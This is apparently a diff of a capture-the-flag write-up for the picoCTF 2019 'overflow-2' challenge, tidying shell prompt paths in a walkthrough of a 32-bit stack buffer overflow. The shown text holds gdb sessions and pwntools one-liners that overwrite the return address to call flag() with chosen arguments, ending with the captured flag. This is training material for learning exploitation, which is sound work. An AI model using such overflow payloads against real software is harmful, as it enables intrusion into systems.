@@ -73,11 +73,11 @@ int main(int argc, char **argv){
 It seems like a program that takes in some input and prints it back to you. Let's try that and some large input.
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ ./vuln
+samson@pico-2019-shell1:/problems/overflow-2$ ./vuln
 Please enter your string: 
 A
 A
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ echo $(python -c "print 'A'*184") | ./vuln
+samson@pico-2019-shell1:/problems/overflow-2$ echo $(python -c "print 'A'*184") | ./vuln
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault (core dumped)
@@ -88,11 +88,11 @@ We need to invoke the `flag()` function like `flag(0xDEADBEEF, 0xC0DED00D)` from
 The hint suggests to look at the stack, so let's do that.
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
+samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
 ... <redacted>
 Reading symbols from ./vuln...(no debugging symbols found)...done.
 (gdb) r
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln 
+Starting program: /problems/overflow-2/vuln 
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -112,14 +112,16 @@ Notice how the `Arglist` is at `0x41414141`. Those are the `A`'s we passed in. S
 
 Let's try 176 `A`'s followed by the rest of the alphabet to see what ends up at the arg list.
 
-`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ`
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+```
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
+samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
 ... <redacted>
 Reading symbols from ./vuln...(no debugging symbols found)...done.
 (gdb) r
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln 
+Starting program: /problems/overflow-2/vuln 
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
@@ -183,12 +185,12 @@ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485e6)" | ./vuln
 Now the arguments `arg1` and `arg2` won't be far past the `FLAG_ADDRESS`. Let's determine where it needs to go.
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'" > /tmp/in
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
+samson@pico-2019-shell1:/problems/overflow-2$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'" > /tmp/in
+samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
 ... <redacted>
 Reading symbols from ./vuln...(no debugging symbols found)...done.
 (gdb) r < /tmp/in
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < /tmp/in
+Starting program: /problems/overflow-2/vuln < /tmp/in
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
 Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
@@ -198,12 +200,12 @@ Flag File is Missing. Problem is Misconfigured, please contact an Admin if you a
 The program doesn't work because gdb isn't running under the same permissions. I'll copy the files over to another directory and attempt it
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ mkdir /tmp/s5
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ cp vuln /tmp/s5/vuln
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ vi /tmp/s5/flag.txt
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ cat /tmp/s5/flag.txt
+samson@pico-2019-shell1:/problems/overflow-2$ mkdir /tmp/s5
+samson@pico-2019-shell1:/problems/overflow-2$ cp vuln /tmp/s5/vuln
+samson@pico-2019-shell1:/problems/overflow-2$ vi /tmp/s5/flag.txt
+samson@pico-2019-shell1:/problems/overflow-2$ cat /tmp/s5/flag.txt
 SAMCTF{123123123123123}
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ pushd . && cd /tmp/s5
+samson@pico-2019-shell1:/problems/overflow-2$ pushd . && cd /tmp/s5
 samson@pico-2019-shell1:/tmp/s5$ gdb ./vuln
 ... <redacted>
 Reading symbols from ./vuln...(no debugging symbols found)...done.
@@ -242,8 +244,8 @@ We know the arguments are just 4 places off the flag adddress.
 
 ```bash
 samson@pico-2019-shell1:/tmp/s5$ popd
-/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'A'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)" | ./vuln 
+/problems/overflow-2
+samson@pico-2019-shell1:/problems/overflow-2$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'A'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)" | ./vuln 
 Please enter your string: 
 ���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
